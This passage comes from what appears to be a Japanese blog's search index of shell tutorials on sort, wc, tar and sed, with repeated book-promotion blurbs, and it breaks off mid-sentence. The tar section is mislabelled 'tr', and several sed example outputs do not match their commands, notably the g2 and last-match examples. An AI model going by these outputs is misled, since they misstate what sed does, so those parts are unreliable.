Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-25T12:39:33+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-25-01-sort-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-25-01-sort-suzuki/","title":"（２１）【sort】シェルスクリプトコマンド活用紹介"},{"content":"wcコマンド 行数と単語数とバイト数を数える 文字数を数える 行数だけを表示する wcコマンド概要 「wc」はテキストファイルの行数や単語数（word count）、文字数を数えるコマンドです。単語は、空白や改行文字で区切られたものを数えます。\nwcコマンドの書式 wc [オプション] [ファイル……]\nwcコマンドの主なオプション オプション 意味 -c バイト数を表示する -m 文字数を表示する（マルチバイト文字に対応） -l 改行の数を表示する -w 単語数を表示する wcコマンド詳細説明 行数と単語数とバイト数を数える 「wc テキストファイル名」で、指定したテキストファイルの行数、単語数、バイト数が表示されます。複数のファイルを指定（ワイルドカード「*」も使用可）した場合は、各ファイルの結果と合計が表示されます。\n実行結果は以下のとおりです。\nbash-5.1$ wc index.md 158 211 7239 index.md bash-5.1$ 表示される値は左から\nファイルの行数 単語数 バイト数となります。\n文字数を数える バイト数ではなく、文字数を数えたい場合は「-m」オプションを使用します。\n実行結果は以下のとおりです。\n$ wc -m filename.txt 行数だけを表示する 行数だけをカウントしたい場合は、「-l」オプションを使用します。\n例えば、「find」コマンドは見つけたファイルを「1件1行」で出力するので、行数を数えることでファイルの個数を知ることができます。\nls -la コマンドでファイルの数を調べる\nbash-5.1$ ls -la | grep -v ^d | wc -l 9 bash-5.1$ ヒント grep -v ^d でディレクトリを除外しています。 ファイルの行数を調べる\n$ cat filename.txt | wc -l ヒント wc -m wc -l この２つは必須です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-20T11:46:21+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-20-01-wc-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-20-01-wc-suzuki/","title":"（２０）【wc】シェルスクリプトコマンド活用紹介"},{"content":"trコマンド アーカイブファイルを作成する アーカイブファイルを展開する trコマンド概要 「tar」は、複数のファイルを1つにまとめた“アーカイブファイル”を作成／展開するコマンドです。\n「アーカイブ（archive）」は「書庫」という意味で、プログラムのソースコードなど、複数の関連するファイル群をまとめて保管したり、配布したりする際に使用します。\ntrコマンドの書式 tar -czvf アーカイブ.tgz 対象ファイル\n（ファイルのアーカイブを作成しgzip形式で圧縮する）\ntar -xzvf アーカイブ.tgz\n（gzipで圧縮されたアーカイブを展開する）\ntrコマンドの主なオプション オプション 意味 -c 新しいアーカイブを作成する -x アーカイブからファイルを抽出する trコマンド詳細説明 アーカイブファイルを作成する アーカイブファイルを作成するには「-c」オプション、アーカイブをgzip形式で圧縮するには「-z」オプションを指定し、「-f」オプションでアーカイブファイル名を指定します。\n$ tar -czvf archive.tgz * アーカイブファイルを展開する アーカイブファイルからファイルを取り出すことを、「展開」あるいは「抽出」と呼びます。\n展開には、先ほどの「-c」オプションの代わりに「-x」オプションを使います（画面2）。また、「-z」はgzip形式用のオプションなので、圧縮されていない場合は「-z」オプションなしで、bzip2形式（拡張子は「.tar.bz2」）の場合は「-j」オプションを使用します。\n$ tar -zxvf archive.tgz ヒント 圧縮は Create（作成）なので -czvf、展開はeXtruct（伸長）で -xzvfです。 圧縮、展開ともに zvf は共通です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-20T11:34:37+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-20-01-tar-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-20-01-tar-suzuki/","title":"（１９）【tar】シェルスクリプトコマンド活用紹介"},{"content":"sedコマンド概要 「sed」は「Stream EDitor」の略で、「sed スクリプトコマンド ファイル名」で、指定したファイルをコマンドに従って処理し、標準出力へ出力します。ファイル名を省略した場合は、標準入力からのデータを処理します。sedコマンドでは、パイプとリダイレクトを活用するのが一般的です。\nsedコマンドの書式 sed [オプション]\nsed [オプション] スクリプトコマンド 入力ファイル\nsedコマンドの主なオプション オプション 意味 -e スクリプト スクリプト（コマンド）を追加する -f スクリプトファイル 実行するコマンドとしてスクリプトファイルの内容を追加する |-t 文字数\t|タブの文字数またはタブ位置のリストを指定する|\nsedのバージョンを確認する $ sed --version 僕の環境では以下のとおりです\nbash-5.1$ sed --version gsed (GNU sed) 4.8 Copyright (C) 2020 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Written by Jay Fenlason, Tom Lord, Ken Pizzini, Paolo Bonzini, Jim Meyering, and Assaf Gordon. This sed program was built without SELinux support. GNU sed home page: \u0026lt;https://www.gnu.org/software/sed/\u0026gt;. General help using GNU software: \u0026lt;https://www.gnu.org/gethelp/\u0026gt;. E-mail bug reports to: \u0026lt;bug-sed@gnu.org\u0026gt;. bash-5.1$ sedコマンド詳細説明 \u0026lsquo;sed\u0026rsquo;を使用した基本的なテキスト置換 sedコマンドを使用してパターンを検索および置換することにより、テキストの特定の部分を検索および置換できます。次の例では、「s」は検索および置換タスクを示します。「BashScriptingLanguage」というテキストで「Bash」という単語が検索され、その単語がテキストに存在する場合は、「Perl」という単語に置き換えられます。\nbash-5.1$ echo \u0026#34;Bash Scripting Language\u0026#34; | sed \u0026#39;s/Bash/Perl/\u0026#39; Perl Scripting Language bash-5.1$ ヒント \u0026rsquo;\u0026rsquo; シングルクォーテーションで囲む場合と\u0026quot;\u0026ldquo;ダブルクォーテーションで囲む場合、動作が異なります。置換前と、置換後の文字列指定を「文字列」で扱う場合はシングルクォーテーションで構いませんが、s/Bash/$value/ などの変数で置き換えたい場合はダブルクォーテーションで囲みます。 ヒント s/Bash/Perl/ と指定する場合の s ですが、substitute（置き換える）です。 まず、weekday.txtを作成します。\nMonday Tuesday Wednesday Thursday Friday Saturday Sunday 以下のコマンドで Sunday を　Sunday is holiday に置き換えます\n$ cat weekday.txt | sed \u0026#39;s/Sunday/Sunday is holiday/\u0026#39; 実行結果は以下のとおりです。\nbash-5.1$ cat weekday.txt | sed \u0026#39;s/Sunday/Sunday is holiday/\u0026#39; Monday Tuesday Wednesday Thursday Friday Saturday Sunday is holiday bash-5.1$ \u0026lsquo;g\u0026rsquo;オプションを使用して、ファイルの特定の行にあるテキストのすべてを置き換える \u0026lsquo;g\u0026rsquo;オプションは、ファイル内の一致するパターンすべてを置き換えます。\nまずpython.txtを作成します\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 以下のコマンドで Python を perl に置き換えます。\n$ cat python.txt | sed \u0026#39;s/Python/perl/g\u0026#39; python.txt 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/Python/perl/g\u0026#39; perl is a very popular language. perl is easy to use. perl is easy to learn. perl is a cross-platform language ヒント s/Python/perl/g と指定する場合の g ですが、global(全体的に）です。 次に２行目の Python を perlに置き換えます。\n置き換えたい行数を 2 と指定しています。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ cat python.txt | sed \u0026#39;2 s/Python/perl/g\u0026#39; python.txt 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;2 s/Python/perl/g\u0026#39; Python is a very popular language. perl is easy to use. perl is easy to learn. Python is a cross-platform language 各行で一致する2番目の値のみを置き換える ファイル中に存在するPythonを、各行の2番目に出現する検索パターンだけをperlに置き換えます。\ng2オプションを使います。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/Python/perl/g2\u0026#39; Python is a very popular language. Python is easy to use. perl is easy to learn. Python is a cross-platform language bash-5.1$ 各行で一致する最後の値のみを置き換える ファイル中に存在するPythonを、各行の最後に出現する検索パターンだけをperlに置き換えます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/\\(.*\\)Programming/\\1Scripting/\u0026#39; Python is a very popular language. Python is easy to use. perl is easy to learn. Python is a cross-platform language bash-5.1$ ヒント \\(.*\\) の部分は正規表現といいます。正規表現は記号を含めて無限に指定することができる激しく便利な機能です。ポピュラーな使い方から覚えて、次第と複雑でトリッキーな使い方を習得していけば良いと思います。Google で sed 正規表現　と検索すればたくさん検索結果が出てきます。 ファイル内の最初の一致を新しいテキストに置き換える 次のコマンドは、検索パターンの最初の一致である「Python」のみをテキスト「perl」に置き換えます。ここで、「1」はパターンの最初の出現に一致するために使用されます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\n$ cat python.txt | sed \u0026#39;1 s/Python/perl/\u0026#39; perl is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language ファイル内の最後の一致を新しいテキストに置き換える 次のコマンドは、最後に出現した検索パターン「Python」をテキスト「Bash」に置き換えます。ここで、「$」記号は、パターンの最後の出現と一致するために使用されます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\n$ cat python.txt | sed \u0026#39;$s/Python/perl/\u0026#39; Python is a very popular language. Python is easy to use. Python is easy to learn. perl is a cross-platform language ヒント 「ファイル内」の最後のマッチです。 ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ 検索および置換するには、ファイルパスのバックスラッシュをエスケープする必要があります。次のsedコマンドは、ファイルパスにバックスラッシュ記号（\\）を追加します。\nヒント \\記号はウインドウズだと￥で表示されます。\nMacでは￥キーを押すことで\\バックスラッシュを入力することできます。\nMacで￥キーを押してもバックスラッシュが入力できない場合は、はOptionキーを押しながら￥を押すことでバックスラッシュを入力することができます。一般的に￥と\\は区別されています。 実行結果は以下のとおりです。\n$ echo /home/ubuntu/code/perl/add.pl | sed \u0026#39;s;/;\\\\/;g\u0026#39; \\/home\\/ubuntu\\/code\\/perl\\/add.pl $ $ echo /home/ubuntu/code/perl/add.pl | sed \u0026#39;s|/|\\\\/|g\u0026#39; \\/home\\/ubuntu\\/code\\/perl\\/add.pl ヒント 上記では「s;」とすることで、セミコロンを区切り文字として指定しています。理由は見た目がわかりやすいからです。\n何でもいいのです。「s|」とすれば、区切り文字はパイプに指定することができます。 ファイルのフルパスをファイル名だけに置き換える ファイル名は、basenameコマンドを使用してファイルパスから非常に簡単に取得できますが、sedコマンドを使用して、ファイルパスからファイル名を取得することもできます。次のコマンドは、echoコマンドで指定されたファイルパスからのみファイル名を取得します。\n$ basename \u0026#34;/home/ubuntu/temp/myfile.txt\u0026#34; myfile.txt $ echo \u0026#34;/home/ubuntu/temp/myfile.txt\u0026#34; | sed \u0026#39;s/.*\\///\u0026#39; myfile.txt $ ヒント basename コマンドを使うのが一般的ですが、sedに置き換えることでsedの正規表現の理解を深めることが狙いです。 マッチした文字列のあとに出現した文字列が見つかった場合に置換する 次のsedコマンドでは、2つの置換コマンドが使用されています。文字列「CSE 」でマッチした行で「Count 」は100に置き換えられ、文字列「EEE」でマッチした行で「Count」は70に置き換えられます。\nCSE - Count EEE - Count Civil - Count 実行結果は以下のとおりです。\n$ cat dept.txt | sed -e \u0026#39;/CSE/ s/Count/100/; /EEE/ s/Count/70/;\u0026#39; CSE - 100 EEE - 70 Civil - Count ヒント 以外に知られていないトリッキーなsedの利用例ですが、とてもよく使われます。 文字列に他のテキストが見つからない場合のみテキストを置き換える 次のsedコマンドは、テキスト「CSE」を含まない行の「Count」値を置き換えます。dept.txtファイルには、テキスト「CSE」を含まない2行が含まれています。したがって、「カウント」テキストは2行で80に置き換えられます。\nCSE - Count EEE - Count Civil - Count 実行結果は以下のとおりです。\n$ cat dept.txt | sed \u0026#39;/CSE/! s/Count/80/;\u0026#39; CSE - Count EEE - 80 Civil - 80 ヒント !（アポストロフィー）をつけると「以外は」という意味になります。 \u0026rsquo; \\ 1 \u0026lsquo;を使用して、一致するパターンの前に文字列を追加 sedコマンドで一致するパターンマッチは、「\\1」、「\\2」などで示されます。\n次のsedコマンドは、パターン\u0026rsquo;Bash\u0026rsquo;を検索し、パターンが一致する場合は、テキストを置き換える部分「bash」を\u0026rsquo;\\1\u0026rsquo;として処理をします。\nここでは、入力テキストで「Bash」というテキストが検索され、「\\1」の前に1つのテキストが追加され、後に別のテキストが追加されます。\n$ echo \u0026#34;Bash language\u0026#34; | sed \u0026#39;s/\\(Bash\\)/Learn \\1 programming/\u0026#39; Learn Bash programming language ヒント 難しく考える必要はありません。\u0026rsquo;s/(文字列)/ で文字列を検索します。その後、検索した文字列を \\1 として、文字A \\1 文字B として出力します。 一致する行を削除 \u0026rsquo;d\u0026rsquo;オプションは、ファイルから任意の行を削除するためにsedコマンドで使用されます。os.txtという名前のファイルを作成し、次のコンテンツを追加して、 「d」オプションの機能をテストします。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt | sed \u0026#39;/OS/ d\u0026#39; Windows Linux Android bash-5.1$ ヒント d オプションは、delete（削除）です。 一致する行の後の2行を削除 次のコマンドは、パターン「Linux」が見つかった場合、ファイルos.txtから3行を削除します。os.txtには、2行目に「Linux 」というテキストが含まれています。したがって、この行と次の2行は削除されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt | sed \u0026#39;/Linux/,+2d\u0026#39; Windows テキスト行の最後にあるすべてのスペースを削除 [:blank:]クラス（といいます）を使用すると、テキストまたは任意のファイルのコンテンツからスペースとタブを削除できます。次のコマンドは、ファイルos.txt の各行の終わりにあるスペースを削除します。\n以下のテキストの行末には半角スペースが３つづつついています。（みえないけど）\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os_space.txt Windows Linux Android OS $ $ cat os_space.txt | sed \u0026#39;/^[[:blank:]]*$/d\u0026#39; Windows Linux Android OS 出力されたテキストには、半角スペースが除去されています（みえないけど）\n行で2回一致するすべての行を削除 次の内容のinput.txtという名前のテキストファイルを作成し、検索パターンを含むファイルの行を2回削除します。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. input.txtファイルには一行に「PHP」というワードが２回表示される行が２行あります。\n以下の例では、sedコマンドの -e オプションを使って、sedコマンドを連続して使用し、パターン\u0026rsquo;PHP\u0026rsquo;を含む２行を削除します。\n最初のsedコマンドは、各行の2番目に出現する\u0026rsquo;PHP\u0026rsquo;を\u0026rsquo;dl\u0026rsquo;に置き換え、次のsedコマンド「-e」で、テキスト\u0026rsquo; dl \u0026lsquo;を含む行を「dオプション」で削除します。\n実行結果は以下のとおりです。\ncat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ $ cat input.txt | sed -e \u0026#39;s/php/dl/i2;\u0026#39; -e \u0026#39;/dl/d\u0026#39; PHP is a server-side scripting language. PHP is platform-independent. 空行を削除 この例をテストするには、コンテンツに空の行が含まれているファイルを選択します。前の例で作成されたinput.txtファイルには、次のsedコマンドを使用して削除できる2つの空の行が含まれています。ここで、「^$」は、ファイルinput.txtの空の行を見つけるために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os_blank.txt Windows Linux Android OS $ cat os_blank.txt | sed \u0026#39;/^$/d\u0026#39; Windows Linux Android OS ヒント ^$ は 行頭（^)と行末（$)の間になにもない（空行）という意味になります。ものすごく良く使います。 印刷できない文字をすべて削除 印刷できない文字をnoneに置き換えることにより、印刷できない文字を任意のテキストから削除できます。\nこの例では、[:print:]クラスを使用して、印刷できない文字を検索します。\u0026rsquo;\\ t\u0026rsquo;は印刷できない文字なので、echoコマンドで直接解析することはできません。\n以下のコマンドを実行すると、「echo」コマンドで使用される変数$tabに「\\t」文字が混入しても、sedコマンドで[:print:]に該当する文字\u0026rsquo;\\t\u0026rsquo;が削除されます。\n実行結果は以下のとおりです。\n$ tab=$\u0026#39;\\t\u0026#39; $ echo Hello\u0026#34;$tab\u0026#34;World Hello\tWorld $ echo Hello\u0026#34;$tab\u0026#34;World | sed \u0026#39;s/[^[:print:]]//g\u0026#39; HelloWorld $ ヒント 上記のコマンドを実行すると、次の出力が表示されます。最初のechoコマンドはTAB付きで出力し、sedコマンドの[^[:print:]]出力できない文字であるタブスペースを削除し出力します。 一致した場合行末に文字列を追加 次のsedコマンドは、 os.txtファイルのテキスト「Windows」を含む行の最後に「10」を追加します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/Windows/ s/$/ 10/\u0026#39; Windows 10 Linux Android OS 一致した場合行前に行を挿入 次のsedコマンドは、前に作成されたinput.txtファイルの「PHP is platform-independent」というテキストを検索します。ファイルのいずれかの行にこのテキストが含まれている場合、「PHP is an interpreted language」がその行の前に挿入されます。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\ncat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ cat input.txt | sed \u0026#39;/PHP is platform-independent/ s/^/PHP is an interpreted language.\\n/\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is an interpreted language. PHP is platform-independent. 一致したら一致行の下に文字列を挿入 次のsedコマンドは、ファイルos.txt内のテキスト\u0026rsquo; Linux\u0026rsquo;を検索し、テキストがいずれかの行に存在する場合は、新しいテキスト\u0026rsquo; Ubuntu \u0026lsquo;がその行の後に挿入されます。\nWindows Linux Android OS 実行結果は以下のとおりです\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/Linux/\u0026amp;\\nUbuntu/\u0026#39; Windows Linux Ubuntu Android OS $ ヒント \u0026amp;\\n が自分自身の行のあとに改行という意味になります。 一致しない場合は行末に文字列を追加 次のsedコマンドは、os.txt内でテキスト「Linux」を含まない行を検索し、各行の最後にテキスト「Operating System」を追加します。ここで、「$」記号は、新しいテキストが追加される行を識別するために使用されます。\nWindows Linux Android OS $ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/Linux/! s/$/ Operating System/\u0026#39; Windows Operating System Linux Android Operating System OS Operating System ヒント /Linux/! で、Linuxという文字列が行になければという意味、$は行末を意味します。Operation Systemの戦闘に空白が有るのがミソです。 一致しない行を削除 web.txtという名前のファイルを作成し、次のコンテンツを追加して、一致するパターンを含まない行を削除します。\nHTML5 JavaScript CSS PHP MySQL JQuery 次のsedコマンドは、テキスト「CSS」を含まない行を検索して削除します。\n実行結果は以下のとおりです。\n$ cat web.txt HTML5 JavaScript CSS PHP MySQL JQuery $ $ cat web.txt | sed \u0026#39;/CSS/!d\u0026#39; CSS 上記のコマンドを実行すると、次の出力が表示されます。\u0026lsquo;CSS\u0026rsquo;というテキストを含むファイルに1行あります。したがってCSSを含む1行だけが出力され、CSSを含まない行は削除されます。\nテキストの後にスペースを追加した後、一致したテキストを複製する 次のsedコマンドは、ファイルpython.txt内の\u0026rsquo;to\u0026rsquo;という単語を検索します。その単語が存在する場合は、スペースを追加して、同じ単語が検索単語の後に挿入されます。ここでは、「\u0026amp;」記号を使用して重複テキストを追加しています。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ cat python.txt Python is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ $ cat python.txt | sed -e \u0026#39;s/to /\u0026amp; to/g\u0026#39; Python is a very popular language. Python is easy to touse. Python is easy to tolearn. Python is a cross-platform language $ ヒント 意味のないサンプルとなりましたが、このコマンドを実行すると、「to」という単語がファイルpython.txtで検索され、この単語はこのファイルの2行目に存在することがわかります。結果、一致するテキストの後にスペースを含む「to 」が追加されます。 文字列のリストの1つを新しい文字列に置き換える この例をテストするには、2つのリストファイルを作成する必要があります。\n1001 =\u0026gt; Jafar Ali 1023 =\u0026gt; Nir Hossain 1067 =\u0026gt; John Michel 1001 CSE GPA-3.63 1002 CSE GPA-3.24 1023 CSE GPA-3.11 1067 CSE GPA-3.84 次のsedコマンドは、上記の2つのテキストファイルの最初の列と一致し、一致するテキストをファイルlist1.txtの3番目の列の値に置き換えます。\n実行結果は以下のとおりです。\n$ cat list1.txt 1001 =\u0026gt; Jafar Ali 1023 =\u0026gt; Nir Hossain 1067 =\u0026gt; John Michel $ $ cat list2.txt 1001 CSE GPA-3.63 1002 CSE GPA-3.24 1023 CSE GPA-3.11 1067 CSE GPA-3.84 $ $ sed `cat list1.txt | awk \u0026#39;{print \u0026#34;-e s/\u0026#34;$1\u0026#34;/\u0026#34;$3\u0026#34;/\u0026#34;}\u0026#39;`\u0026lt;\u0026lt;\u0026lt;\u0026#34;` cat list2.txt`\u0026#34; Jafar CSE GPA-3.63 1002 CSE GPA-3.24 Nir CSE GPA-3.11 John CSE GPA-3.84 ヒント list1.txtファイルの1001、1023、1067は、list2.txtファイルの3つのデータと一致し、これらの値は、list1.txtの3番目の列の対応する名前に置き換えられます。 一致した文字列を改行を含む文字列に置き換える 次のコマンドは、 